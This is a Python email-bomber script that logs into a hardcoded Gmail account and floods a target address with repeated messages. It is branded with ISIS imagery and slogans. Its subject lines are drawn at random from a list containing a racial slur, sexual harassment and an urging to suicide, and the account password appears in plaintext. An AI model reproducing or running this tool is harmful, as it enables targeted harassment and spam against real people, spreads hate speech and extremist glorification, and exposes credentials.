import os 
import sys
import getpass
import smtplib
import secrets
import random

if len(sys.argv) < 2:
    os.system("clear || cls")
    sys.stdout.write('''  

                            ██▓  ██████  ██▓  ██████ 
                           ▓██▒▒██    ▒ ▓██▒▒██    ▒ 
                           ▒██▒░ ▓██▄   ▒██▒░ ▓██▄   
                           ░██░  ▒   ██▒░██░  ▒   ██▒
                           ░██░▒██████▒▒░██░▒██████▒▒
                            ░▓  ▒ ▒▓▒ ▒ ░░▓  ▒ ▒▓▒ ▒ ░
                            ▒ ░░ ░▒  ░ ░ ▒ ░░ ░▒  ░ ░
                                                                               
    '''.center(60) + 'ISIS'.center(72) +
    '\n' + '\tin allahu we trust.'.center(76) +
    '\n' + '\tbombing emails instead of countries\n'.center(80) + '\n')
else:
    sys.exit('Usage: python isis.py')
    os.system("clear || cls")
	

email = ('isisbomber733@gmail.com')
pswd = ('isisbomber195')
vemail = input('--> '+'Enter the other persons email : ')
subject = ['Can We Fuck', 'You are a nigger', 'isisbomber', 'suck my balls dry', 'kill yourself']
message = input('--> '+'Enter the message to spam : ')
count = int(input('--> '+'How much emails to bomb : '))

print()
BODY = "\r\n".join(("From: %s" % email,"To: %s" % vemail,"Subject: %s" % secrets.choice(subject) ,"",message))
try:
    smtp_server = 'smtp.gmail.com'
    port = 587
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(email,pswd)
    i = 0
    print('[*] '+' Bombing is in Progress \n')
    while i < count:
        i+=1
        server.sendmail(email,vemail,BODY)
        if i == 1:
            print ('[✓] '+' %dst Bomb has been sent successfully ' %(i))
        elif i == 2:
            print ('[✓] '+' %dnd Bomb has been sent successfully ' %(i))
        elif i == 3:
            print ('[✓] '+' %drd Bomb has been sent successfully ' %(i))
        else:
            print ('[✓] '+' %dth Bomb has been sent successfully ' %(i))
        sys.stdout.flush()
    server.quit()
    print('[✓] '+'Bombed the citizen with emails.')

except KeyboardInterrupt:
    print(" ")
    print ('[x] '+' Canceled')
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print(" ")
    print('[x] '+' The username or password you entered is incorrect.')
    print ('[x] '+' Check if the Options of Applications are less secure is enabled ')
    sys.exit()

